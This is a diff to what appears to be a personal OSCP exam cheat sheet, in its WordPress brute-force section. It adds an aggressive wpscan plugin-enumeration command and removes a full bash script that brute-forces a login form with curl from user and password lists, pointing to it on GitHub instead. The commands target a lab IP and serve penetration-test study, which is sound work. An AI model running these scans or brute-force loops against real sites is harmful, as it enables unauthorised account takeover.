@@ -473,6 +473,9 @@ a. Network Exploitation
 	2. WebServer Exploitation - Bruteforce
 		i.) Run wordpress scanner to scan if website has wordpress
 			wpscan --url $IP_Address
+
+		    Run Wordpress scanner for plugins if there is vulerability:
+			wpscan --url $IP_Address --enumerate -p --plugins-detection aggressive -o websrv1/wpscan
 	
 		ii.) Bruteforce Wordpress using MSFConsole
 			msfconsole: search wordpress enum
@@ -480,34 +483,10 @@ a. Network Exploitation
 		iii.) Bruteforce using BurpSuite
 			Use Bruteforce in BurpSuite for places with login like wordpress phpadmin
 			
-		iv.) Bruteforce using Curl - check if its post:
-		curl http://192.168.64.138/adv/control/ex8/php/login.php -X POST -d '{"username":"user","password":"password"}' 
-		write a script to bruteforce using a username list / password list
+		iv.) Bruteforce using Curl - check if its post - refer to script below:
+		https://github.com/LohKianYuan/MY_OSCP_CHEATSHEET/blob/main/BF_2_Curl_post
+
 		
-		script:
-		
-		#!/bin/bash
-
-		# Define the target URL, replace URL as necessary
-		url="http://192.168.64.138/adv/control/ex8/php/login.php"
-
-		# Loop through each user in user.lst
-		while read -r user; do
-			# Loop through each password in password.lst
-			while read -r password; do
-				# Send POST request with the current user and password
-				echo "Trying username: $user and password: $password"
-				response=$(curl -s -X POST "$url" \
-					-H "Content-Type: application/json" \
-					-d "{\"username\":\"$user\", \"password\":\"$password\"}")
-
-				# Check if the response contains the word "Login Success" #replace as necessary.
-				if echo "$response" | grep -q "Login Success"; then
-					echo "Login Success with username: $user and password: $password"
-					break 2 # Stop after finding a successful login
-				fi
-			done < password.lst
-		done < user.lst
 		========================================end========================================
 
 	3.) SQL/XSS/Command Injections
